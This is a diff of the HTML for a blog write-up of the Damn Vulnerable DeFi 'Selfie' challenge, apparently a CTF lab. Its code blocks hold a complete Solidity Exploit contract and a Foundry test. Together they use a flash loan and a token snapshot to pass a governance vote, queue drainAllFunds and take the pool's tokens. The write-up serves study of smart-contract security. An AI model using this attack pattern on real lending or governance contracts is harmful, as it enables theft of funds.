@@ -66,26 +66,22 @@ Challenge Link to heading A new cool lending pool has launched! It’s now offer
 <link rel="preload" href="https://vyorkin.org/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="preload" href="https://vyorkin.org/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
 
-
-  
-  
-  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.07092c1350ffd254998dc43a44ae96e617d14af4df4602626878df89189c5e1a.css" integrity="sha256-BwksE1D/0lSZjcQ6RK6W5hfRSvTfRgJiaHjfiRicXho=" crossorigin="anonymous" media="screen" />
-
-
-
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
 
 
   
-    
-    
-    <link rel="stylesheet" href="https://vyorkin.org/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
   
+  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.070807f22ed87a923883f1a61d2e227d67d923b7fa424ed9a2bf875f4949406e.css" integrity="sha256-BwgH8i7YepI4g/GmHS4ifWfZI7f6Qk7Zor&#43;HX0lJQG4=" crossorigin="anonymous" media="screen" />
+
+
+
+
 
 
 
 
   
-  <link rel="stylesheet" href="https://vyorkin.org/custom.min.cf4424ca575c8638b55547ace7bc3ab68c44ff1c808b1f1bb2358cdbcdbd8c41.css" integrity="sha256-z0Qkyldchji1VUes57w6toxE/xyAix8bsjWM2829jEE=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="https://vyorkin.org/custom.min.e79d44f53b0c4396d73bb2d809d0abbfb31a859a259ae12ed5d6c3a2af56d353.css" integrity="sha256-551E9TsMQ5bXO7LYCdCrv7MahZolmuEu1dbDoq9W01M=" crossorigin="anonymous" media="screen" />
 
 
 <link rel="icon" type="image/svg+xml" href="https://vyorkin.org/images/favicon.svg" sizes="any">
@@ -111,9 +107,7 @@ Challenge Link to heading A new cool lending pool has launched! It’s now offer
 
 
 
-
-
-<body class="preload-transitions colorscheme-auto">
+<body class="preload-transitions colorscheme-light">
   
 <div class="float-container">
     <a id="dark-mode-toggle" class="colorscheme-toggle">
@@ -152,8 +146,6 @@ Challenge Link to heading A new cool lending pool has launched! It’s now offer
           
           
             
-          
-            
               
                 <li class="navigation-item menu-separator">
                   <span>|</span>
@@ -163,6 +155,8 @@ Challenge Link to heading A new cool lending pool has launched! It’s now offer
               <li class="navigation-item">
                 <a href="https://vyorkin.org/ru-ru/">ru</a>
               </li>
+            
+          
             
           
             
@@ -261,18 +255,18 @@ seen many times before, expect that it has one extra function
 <code>drainAllFunds</code> that relies on governance. This function allows
 transfering all DVT&rsquo;s to the given address and it is guarded by
 the <code>onlyGovernance</code> modifier:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> drainAllFunds(<span style="color:#fff;font-weight:bold">address</span> receiver) <span style="color:#fff;font-weight:bold">external</span> onlyGovernance {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> amount = token.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>));
-</span></span><span style="display:flex;"><span>    token.<span style="color:#fff;font-weight:bold">transfer</span>(receiver, amount);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    emit FundsDrained(receiver, amount);
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">drainAllFunds</span><span class="p">(</span><span class="kt">address</span> <span class="n">receiver</span><span class="p">)</span> <span class="k">external</span> <span class="n">onlyGovernance</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">amount</span> <span class="o">=</span> <span class="n">token</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">token</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">receiver</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">emit</span> <span class="n">FundsDrained</span><span class="p">(</span><span class="n">receiver</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>This modifier makes sure that the function is being called by the
 governance contract:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">modifier</span> onlyGovernance() {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span> != <span style="color:#fff;font-weight:bold">address</span>(governance)) <span style="color:#fff;font-weight:bold">revert</span> OnlyGovernanceAllowed();
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">_</span>;
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">modifier</span> <span class="nf">onlyGovernance</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="n">governance</span><span class="p">))</span> <span class="nb">revert</span> <span class="n">OnlyGovernanceAllowed</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">_</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>All we need to do is to make the governance contract call the
 <code>drainAllFunds</code> function somehow.</p>
 <h3 id="simplegorvernance">
@@ -284,16 +278,16 @@ governance contract:</p>
 </h3>
 <p>It has 2 functions to queue and execute action proposals:
 <code>queueAction</code> and <code>executeAction</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> queueAction(
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">address</span> receiver,
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">bytes</span> calldata <span style="color:#fff;font-weight:bold">data</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> weiAmount
-</span></span><span style="display:flex;"><span>) <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">returns</span> (<span style="color:#fff;font-weight:bold">uint256</span>) {
-</span></span><span style="display:flex; background-color:#191919"><span>    <span style="color:#fff;font-weight:bold">if</span> (!_hasEnoughVotes(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>)) <span style="color:#fff;font-weight:bold">revert</span> NotEnoughVotesToPropose();
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (receiver == <span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>))
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">revert</span> CannotQueueActionsThatAffectGovernance();
-</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// ...
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">queueAction</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="n">receiver</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bytes</span> <span class="n">calldata</span> <span class="nb">data</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">weiAmount</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line hl"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">_hasEnoughVotes</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">))</span> <span class="nb">revert</span> <span class="n">NotEnoughVotesToPropose</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">receiver</span> <span class="o">==</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">revert</span> <span class="n">CannotQueueActionsThatAffectGovernance</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>The first function adds an action proposal to the queue, where
 the &ldquo;action proposal&rdquo; is an arbitrary function call at
 <code>receiver</code> address. It starts with 2 pre-conditions:</p>
@@ -308,34 +302,34 @@ In other words, it forbids calling the governance contract
 from actions.</li>
 </ol>
 <!--listend-->
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> _hasEnoughVotes(<span style="color:#fff;font-weight:bold">address</span> account) <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">view</span> <span style="color:#fff;font-weight:bold">returns</span> (<span style="color:#fff;font-weight:bold">bool</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> <span style="color:#fff;font-weight:bold">balance</span> = governanceToken.getBalanceAtLastSnapshot(account);
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> halfTotalSupply = governanceToken
-</span></span><span style="display:flex;"><span>        .getTotalSupplyAtLastSnapshot() / <span style="color:#ff0;font-weight:bold">2</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">balance</span> &gt; halfTotalSupply;
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">_hasEnoughVotes</span><span class="p">(</span><span class="kt">address</span> <span class="n">account</span><span class="p">)</span> <span class="k">private</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="nb">balance</span> <span class="o">=</span> <span class="n">governanceToken</span><span class="p">.</span><span class="n">getBalanceAtLastSnapshot</span><span class="p">(</span><span class="n">account</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">halfTotalSupply</span> <span class="o">=</span> <span class="n">governanceToken</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">getTotalSupplyAtLastSnapshot</span><span class="p">()</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">balance</span> <span class="o">&gt;</span> <span class="n">halfTotalSupply</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>Let&rsquo;s look at the second external function:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> executeAction(<span style="color:#fff;font-weight:bold">uint256</span> actionId) <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {
-</span></span><span style="display:flex; background-color:#191919"><span>    <span style="color:#fff;font-weight:bold">if</span> (!_canBeExecuted(actionId)) <span style="color:#fff;font-weight:bold">revert</span> CannotExecuteThisAction();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    GovernanceAction <span style="color:#fff;font-weight:bold">storage</span> actionToExecute = actions[actionId];
-</span></span><span style="display:flex;"><span>    actionToExecute.executedAt = <span style="color:#fff;font-weight:bold">block</span>.<span style="color:#fff;font-weight:bold">timestamp</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    actionToExecute.receiver.functionCallWithValue(
-</span></span><span style="display:flex;"><span>        actionToExecute.<span style="color:#fff;font-weight:bold">data</span>,
-</span></span><span style="display:flex;"><span>        actionToExecute.weiAmount
-</span></span><span style="display:flex;"><span>    );
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    emit ActionExecuted(actionId, <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">executeAction</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">actionId</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line hl"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">_canBeExecuted</span><span class="p">(</span><span class="n">actionId</span><span class="p">))</span> <span class="nb">revert</span> <span class="n">CannotExecuteThisAction</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">GovernanceAction</span> <span class="k">storage</span> <span class="n">actionToExecute</span> <span class="o">=</span> <span class="n">actions</span><span class="p">[</span><span class="n">actionId</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">actionToExecute</span><span class="p">.</span><span class="n">executedAt</span> <span class="o">=</span> <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">actionToExecute</span><span class="p">.</span><span class="n">receiver</span><span class="p">.</span><span class="n">functionCallWithValue</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">actionToExecute</span><span class="p">.</span><span class="nb">data</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">actionToExecute</span><span class="p">.</span><span class="n">weiAmount</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">emit</span> <span class="n">ActionExecuted</span><span class="p">(</span><span class="n">actionId</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>It checks that 2 days have passed since an action was queued by
 calling the <code>_canBeExecuted</code> function:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> _canBeExecuted(<span style="color:#fff;font-weight:bold">uint256</span> actionId) <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">view</span> <span style="color:#fff;font-weight:bold">returns</span> (<span style="color:#fff;font-weight:bold">bool</span>) {
-</span></span><span style="display:flex;"><span>    GovernanceAction <span style="color:#fff;font-weight:bold">memory</span> actionToExecute = actions[actionId];
-</span></span><span style="display:flex; background-color:#191919"><span>    <span style="color:#fff;font-weight:bold">return</span> (actionToExecute.executedAt == <span style="color:#ff0;font-weight:bold">0</span> &amp;&amp;
-</span></span><span style="display:flex; background-color:#191919"><span>        (<span style="color:#fff;font-weight:bold">block</span>.<span style="color:#fff;font-weight:bold">timestamp</span> - actionToExecute.proposedAt &gt;=
-</span></span><span style="display:flex; background-color:#191919"><span>            ACTION_DELAY_IN_SECONDS));
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">_canBeExecuted</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">actionId</span><span class="p">)</span> <span class="k">private</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">GovernanceAction</span> <span class="k">memory</span> <span class="n">actionToExecute</span> <span class="o">=</span> <span class="n">actions</span><span class="p">[</span><span class="n">actionId</span><span class="p">];</span>
+</span></span><span class="line hl"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">actionToExecute</span><span class="p">.</span><span class="n">executedAt</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line hl"><span class="cl">        <span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span> <span class="o">-</span> <span class="n">actionToExecute</span><span class="p">.</span><span class="n">proposedAt</span> <span class="o">&gt;=</span>
+</span></span><span class="line hl"><span class="cl">            <span class="n">ACTION_DELAY_IN_SECONDS</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><h3 id="damnvaluabletokensnapshot">
   DamnValuableTokenSnapshot
   <a class="heading-link" href="#damnvaluabletokensnapshot">
@@ -386,50 +380,50 @@ to travel in time 2 days ahead.</li>
 <code>attacker</code>&rsquo;s address.</li>
 </ol>
 <p>Let&rsquo;s go ahead and implement the <code>Exploit</code> contract:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> Exploit {
-</span></span><span style="display:flex;"><span>    SimpleGovernance <span style="color:#fff;font-weight:bold">private</span> gov;
-</span></span><span style="display:flex;"><span>    SelfiePool <span style="color:#fff;font-weight:bold">private</span> pool;
-</span></span><span style="display:flex;"><span>    DamnValuableTokenSnapshot <span style="color:#fff;font-weight:bold">private</span> dvts;
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">private</span> owner;
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> <span style="color:#fff;font-weight:bold">public</span> actionId;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>(SelfiePool _pool, DamnValuableTokenSnapshot _dvts) {
-</span></span><span style="display:flex;"><span>        owner = <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>;
-</span></span><span style="display:flex;"><span>        pool = _pool;
-</span></span><span style="display:flex;"><span>        dvts = _dvts;
-</span></span><span style="display:flex;"><span>        gov = _pool.governance();
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> run() <span style="color:#fff;font-weight:bold">external</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> poolBalance = dvts.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(pool));
-</span></span><span style="display:flex;"><span>        pool.flashLoan(poolBalance);
-</span></span><span style="display:flex;"><span>        dvts.approve(owner, poolBalance);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> receiveTokens(<span style="color:#fff;font-weight:bold">address</span> _dvts, <span style="color:#fff;font-weight:bold">uint256</span> _amount) <span style="color:#fff;font-weight:bold">external</span> {
-</span></span><span style="display:flex;"><span>        dvts.snapshot();
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">bytes</span> <span style="color:#fff;font-weight:bold">memory</span> payload = <span style="color:#fff;font-weight:bold">abi</span>.<span style="color:#fff;font-weight:bold">encodeWithSignature</span>(
-</span></span><span style="display:flex;"><span>            <span style="color:#0ff;font-weight:bold">&#34;drainAllFunds(address)&#34;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>)
-</span></span><span style="display:flex;"><span>        );
-</span></span><span style="display:flex;"><span>        actionId = gov.queueAction(<span style="color:#fff;font-weight:bold">address</span>(pool), payload, <span style="color:#ff0;font-weight:bold">0</span>);
-</span></span><span style="display:flex;"><span>        DamnValuableTokenSnapshot(_dvts).<span style="color:#fff;font-weight:bold">transfer</span>(<span style="color:#fff;font-weight:bold">address</span>(pool), _amount);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Exploit</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SimpleGovernance</span> <span class="k">private</span> <span class="n">gov</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SelfiePool</span> <span class="k">private</span> <span class="n">pool</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DamnValuableTokenSnapshot</span> <span class="k">private</span> <span class="n">dvts</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">private</span> <span class="n">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">actionId</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="n">SelfiePool</span> <span class="n">_pool</span><span class="p">,</span> <span class="n">DamnValuableTokenSnapshot</span> <span class="n">_dvts</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pool</span> <span class="o">=</span> <span class="n">_pool</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dvts</span> <span class="o">=</span> <span class="n">_dvts</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">gov</span> <span class="o">=</span> <span class="n">_pool</span><span class="p">.</span><span class="n">governance</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">poolBalance</span> <span class="o">=</span> <span class="n">dvts</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pool</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pool</span><span class="p">.</span><span class="n">flashLoan</span><span class="p">(</span><span class="n">poolBalance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dvts</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="n">owner</span><span class="p">,</span> <span class="n">poolBalance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">receiveTokens</span><span class="p">(</span><span class="kt">address</span> <span class="n">_dvts</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dvts</span><span class="p">.</span><span class="n">snapshot</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">payload</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;drainAllFunds(address)&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">actionId</span> <span class="o">=</span> <span class="n">gov</span><span class="p">.</span><span class="n">queueAction</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pool</span><span class="p">),</span> <span class="n">payload</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">DamnValuableTokenSnapshot</span><span class="p">(</span><span class="n">_dvts</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pool</span><span class="p">),</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>Here is the high-level exploit code:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> testExploit() <span style="color:#fff;font-weight:bold">public</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT START **/</span>
-</span></span><span style="display:flex;"><span>    vm.startPrank(attacker);
-</span></span><span style="display:flex;"><span>    Exploit expl = <span style="color:#fff;font-weight:bold">new</span> Exploit(selfiePool, dvtSnapshot);
-</span></span><span style="display:flex;"><span>    expl.run();
-</span></span><span style="display:flex;"><span>    vm.warp(<span style="color:#fff;font-weight:bold">block</span>.<span style="color:#fff;font-weight:bold">timestamp</span> + <span style="color:#ff0;font-weight:bold">2</span> <span style="color:#fff;font-weight:bold">days</span>);
-</span></span><span style="display:flex;"><span>    simpleGovernance.executeAction(expl.actionId());
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> totalAmount = dvtSnapshot.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(expl));
-</span></span><span style="display:flex;"><span>    dvtSnapshot.transferFrom(<span style="color:#fff;font-weight:bold">address</span>(expl), attacker, totalAmount);
-</span></span><span style="display:flex;"><span>    vm.stopPrank();
-</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT END **/</span>
-</span></span><span style="display:flex;"><span>    validation();
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">testExploit</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/** EXPLOIT START **/</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="p">.</span><span class="n">startPrank</span><span class="p">(</span><span class="n">attacker</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Exploit</span> <span class="n">expl</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Exploit</span><span class="p">(</span><span class="n">selfiePool</span><span class="p">,</span> <span class="n">dvtSnapshot</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">expl</span><span class="p">.</span><span class="n">run</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="p">.</span><span class="n">warp</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span> <span class="o">+</span> <span class="mi">2</span> <span class="kc">days</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">simpleGovernance</span><span class="p">.</span><span class="n">executeAction</span><span class="p">(</span><span class="n">expl</span><span class="p">.</span><span class="n">actionId</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">totalAmount</span> <span class="o">=</span> <span class="n">dvtSnapshot</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">expl</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dvtSnapshot</span><span class="p">.</span><span class="n">transferFrom</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">expl</span><span class="p">),</span> <span class="n">attacker</span><span class="p">,</span> <span class="n">totalAmount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="p">.</span><span class="n">stopPrank</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/** EXPLOIT END **/</span>
